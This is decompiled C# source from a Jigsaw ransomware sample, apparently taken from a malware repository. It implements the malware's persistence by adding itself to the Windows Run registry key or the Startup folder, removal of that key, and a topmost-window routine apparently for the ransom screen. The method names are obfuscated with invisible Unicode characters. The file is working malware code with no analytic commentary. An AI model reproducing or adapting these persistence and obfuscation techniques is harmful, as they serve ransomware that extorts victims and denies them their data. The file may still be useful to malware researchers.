// Decompiled with JetBrains decompiler
// Type: Main.Tools.Windows
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-773295583998b76b4e24b562f85fa685577067614133db4a7df3d2a28cb4cc3a.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Main.Tools
{
  internal static class Windows
  {
    private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
    private const uint SWP_NOSIZE = 1;
    private const uint SWP_NOMOVE = 2;

    internal static void SetStartup(Main.Tools.Windows.StartupMethodType startupMethod)
    {
      if (startupMethod != Main.Tools.Windows.StartupMethodType.StartupFolder)
      {
        if (startupMethod != Main.Tools.Windows.StartupMethodType.Registry)
          return;
        try
        {
          Main.Tools.Windows.SetStartupRegistry(Config.FinalExePath);
        }
        catch
        {
          Main.Tools.Windows.SetStartupFolder();
        }
      }
      else
        Main.Tools.Windows.SetStartupFolder();
    }

    private static void SetStartupFolder()
    {
      if (Config.FinalExeRelativePath == null)
        return;
      Config.FinalExePath = Main.Tools.Windows.\u200D⁬‍‌‮⁯‮‭‭⁬‎‏⁯⁫‫‮‏‪‪‭‌⁪⁪‫‮‫‬⁮⁪⁫⁮‎‫‏‭‍‍‮‎⁭‮(Main.Tools.Windows.\u202D⁫⁫⁭‌‭⁭​⁮‮‪‬‮‭‫⁮‌⁭‬‪⁬⁪⁭‫⁯⁬⁮⁪⁯⁫‌⁪‫⁬‎⁮‬‮⁭‮‮(Environment.SpecialFolder.Startup), Main.Tools.Windows.\u200F‍​‮‮⁭⁪⁪‌‪‌⁫‪⁯⁭⁬⁮‍‫‌⁫‫​‎‮‬⁫‍‌‌‬⁪⁯‭⁬‬⁬⁮‏⁭‮(Config.FinalExeRelativePath));
    }

    private static void SetStartupRegistry(string exePath)
    {
      RegistryKey registryKey = Main.Tools.Windows.\u206E​‎⁭‫‪‫​‫‭‫‫‬‌‌⁮​​‬‫‍‫⁪‌‬⁯‍⁮⁯‍⁭⁬‪⁯⁫​‬‮‎‮(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      if (registryKey == null)
        return;
      Main.Tools.Windows.\u200F‎​⁫‬‮‬‏⁪⁭‪⁪‫‏‪⁬⁪‪‮‫⁮‎⁬‭‏‭‎‎‍‪‭‎⁭⁮⁭⁫⁯⁮‭‬‮(registryKey, Main.Tools.Windows.\u200F‍​‮‮⁭⁪⁪‌‪‌⁫‪⁯⁭⁬⁮‍‫‌⁫‫​‎‮‬⁫‍‌‌‬⁪⁯‭⁬‬⁬⁮‏⁭‮(exePath), (object) exePath);
    }

    internal static void RemoveStartupRegistry(string exePath)
    {
      RegistryKey registryKey = Main.Tools.Windows.\u206E​‎⁭‫‪‫​‫‭‫‫‬‌‌⁮​​‬‫‍‫⁪‌‬⁯‍⁮⁯‍⁭⁬‪⁯⁫​‬‮‎‮(Registry.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      if (registryKey == null)
        return;
      Main.Tools.Windows.\u200F‫⁪‪‎‍⁮‫‬​⁮⁫‭‭‍​⁫⁭⁮‮‪⁫‮​‎‬‭‮⁪‭⁭⁬‫‌⁬‍‮⁯⁯‫‮(registryKey, Main.Tools.Windows.\u200F‍​‮‮⁭⁪⁪‌‪‌⁫‪⁯⁭⁬⁮‍‫‌⁫‫​‎‮‬⁫‍‌‌‬⁪⁯‭⁬‬⁬⁮‏⁭‮(exePath), false);
    }

    [DllImport("user32.dll")]
    private static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int X,
      int Y,
      int cx,
      int cy,
      uint uFlags);

    internal static void MakeTopMost(Form f) => Main.Tools.Windows.SetWindowPos(Main.Tools.Windows.\u202C‪‍⁬‬⁭‏‭‮‬‍‪‮‏⁯‭⁭‮‬‎⁯‏‬‌‎‌‪‪‪‬⁯‫⁬⁯‪‬⁯⁯‫‏‮((Control) f), Main.Tools.Windows.HWND_TOPMOST, 0, 0, 0, 0, 3U);

    static string \u202D⁫⁫⁭‌‭⁭​⁮‮‪‬‮‭‫⁮‌⁭‬‪⁬⁪⁭‫⁯⁬⁮⁪⁯⁫‌⁪‫⁬‎⁮‬‮⁭‮‮([In] Environment.SpecialFolder obj0) => Environment.GetFolderPath(obj0);

    static string \u200F‍​‮‮⁭⁪⁪‌‪‌⁫‪⁯⁭⁬⁮‍‫‌⁫‫​‎‮‬⁫‍‌‌‬⁪⁯‭⁬‬⁬⁮‏⁭‮([In] string obj0) => Path.GetFileName(obj0);

    static string \u200D⁬‍‌‮⁯‮‭‭⁬‎‏⁯⁫‫‮‏‪‪‭‌⁪⁪‫‮‫‬⁮⁪⁫⁮‎‫‏‭‍‍‮‎⁭‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static RegistryKey \u206E​‎⁭‫‪‫​‫‭‫‫‬‌‌⁮​​‬‫‍‫⁪‌‬⁯‍⁮⁯‍⁭⁬‪⁯⁫​‬‮‎‮(
      [In] RegistryKey obj0,
      [In] string obj1,
      [In] bool obj2)
    {
      return obj0.OpenSubKey(obj1, obj2);
    }

    static void \u200F‎​⁫‬‮‬‏⁪⁭‪⁪‫‏‪⁬⁪‪‮‫⁮‎⁬‭‏‭‎‎‍‪‭‎⁭⁮⁭⁫⁯⁮‭‬‮(
      [In] RegistryKey obj0,
      [In] string obj1,
      [In] object obj2)
    {
      obj0.SetValue(obj1, obj2);
    }

    static void \u200F‫⁪‪‎‍⁮‫‬​⁮⁫‭‭‍​⁫⁭⁮‮‪⁫‮​‎‬‭‮⁪‭⁭⁬‫‌⁬‍‮⁯⁯‫‮(
      [In] RegistryKey obj0,
      [In] string obj1,
      [In] bool obj2)
    {
      obj0.DeleteValue(obj1, obj2);
    }

    static IntPtr \u202C‪‍⁬‬⁭‏‭‮‬‍‪‮‏⁯‭⁭‮‬‎⁯‏‬‌‎‌‪‪‪‬⁯‫⁬⁯‪‬⁯⁯‫‏‮([In] Control obj0) => obj0.Handle;

    internal enum StartupMethodType
    {
      StartupFolder,
      Registry,
    }
  }
}
